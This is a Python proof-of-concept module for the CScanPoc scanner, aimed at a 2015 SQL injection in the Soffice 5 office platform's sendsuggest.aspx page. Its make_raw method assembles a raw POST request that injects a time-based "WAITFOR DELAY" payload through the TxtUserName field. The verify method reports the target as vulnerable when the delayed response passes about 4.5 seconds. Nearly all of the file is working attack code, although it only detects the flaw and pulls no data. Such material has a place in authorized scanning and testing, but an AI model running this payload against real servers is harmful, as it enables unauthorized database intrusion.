# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import time
import re


class Vuln(ABVuln):
    vuln_id = 'Soffice_0000'  # 平台漏洞编号，留空
    name = 'Soffice 5 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-10-15'  # 漏洞公布时间
    desc = '''
        Soffice，赛飞软件Soffice小组主要作品，国内重量级全方位协同办公平台和中小企业云优质基础产品，覆盖30人-3000人的企业级用户，提供数字办公全面解决方案，是目前功能最完整技术最先进的协同办公平台之一。
        赛飞软件Soffice全方位协同办公平台 /advicemanage/sendsuggest.aspx 页面参数过滤不严谨，导致SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0146921'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Soffice'  # 漏洞应用名称
    product_version = '5'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '5b05d503-cd61-4825-8968-3a736cf5bcf0'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-18'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # ref:http://www.wooyun.org/bugs/wooyun-2015-0146921
            hh = hackhttp.hackhttp()
            preWork = self.target + '/advicemanage/sendsuggest.aspx'
            code, head, res, errcode, _ = hh.http(preWork)
            if code != 200:
                return
            patten = re.findall(r'value=\"(?P<aa>[\w\+\/\=]{1,}?)\"', res)
            if patten:
                p1 = urllib.parse.quote(patten[0])
                code1, head, res, errcode, _ = hh.http(
                    preWork, raw=self.make_raw(p1, 1))
                timea = time.time()
                code2, head, res, errcode, _ = hh.http(
                    preWork, raw=self.make_raw(p1, 5))
                timeb = time.time()
                if code1 == 200 and code2 == 200 and timeb - timea > 4.5:
                    # security_hole(preWork)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

    def make_raw(self, view_state, sleep_time):
        raw = '''
POST /advicemanage/sendsuggest.aspx HTTP/1.1
Host: localhost:800
Proxy-Connection: keep-alive
Content-Length: 207
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Origin: http://localhost:800
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36
Content-Type: application/x-www-form-urlencoded
DNT: 1
Referer: http://localhost:800/advicemanage/sendsuggest.aspx
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8

__VIEWSTATE=
                    ''' + view_state + '''&TxtUserName=asdasd');WAITFOR DELAY '0:0:''' + str(sleep_time) + ''''--&TxtPhone=13012341234&TxtAddress=1+Llantwit+Street&TxtEmail=sadsd%40111.com&TxtTitle=sdasdasd&FCKContent=&IBSend.x=37&IBSend.y=11'''
        return raw


if __name__ == '__main__':
    Poc().run()
